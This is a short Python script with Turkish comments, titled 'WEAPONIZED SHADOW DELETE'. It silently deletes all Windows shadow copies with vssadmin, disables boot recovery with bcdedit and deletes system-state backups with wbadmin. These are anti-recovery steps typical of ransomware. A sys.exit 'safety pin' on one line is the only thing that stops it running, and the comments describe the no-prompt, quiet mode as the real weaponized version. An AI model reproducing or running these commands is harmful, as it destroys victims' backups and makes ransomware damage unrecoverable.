import os
import sys
import ctypes

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod sistem geri yükleme noktalarını siler.")

print("--- WEAPONIZED SHADOW DELETE ---")

def delete_shadow_copies():
    # Yönetici yetkisi kontrolü (Atlandı varsayalım)
    
    print("[*] VSS (Volume Shadow Service) hedefleniyor...")
    
    # 1. KOMUT İNŞASI (Weaponized Part)
    # Simülasyon: input("Sileyim mi?")
    # Gerçek: Kullanıcıya sormadan, hata göstermeden (Quiet) sil.
    
    # /All   = Hepsini sil
    # /Quiet = Hata mesajı gösterme
    cmd = "vssadmin.exe Delete Shadows /All /Quiet"
    
    # 2. PENCERE GİZLEME
    # Komut penceresi açılıp kapanmasın diye gizli çalıştır.
    # (os.system yerine subprocess veya WinExec kullanılabilir)
    
    print(f"[!] Çalıştırılıyor: {cmd}")
    os.system(cmd)
    
    # Ekstra: Yedekleme servislerini durdur
    os.system("bcdedit /set {default} recoveryenabled No")
    os.system("wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest")
    
    print("💀 YEDEKLER SİLİNDİ. Geri dönüş kapalı.")

if __name__ == "__main__":
    delete_shadow_copies()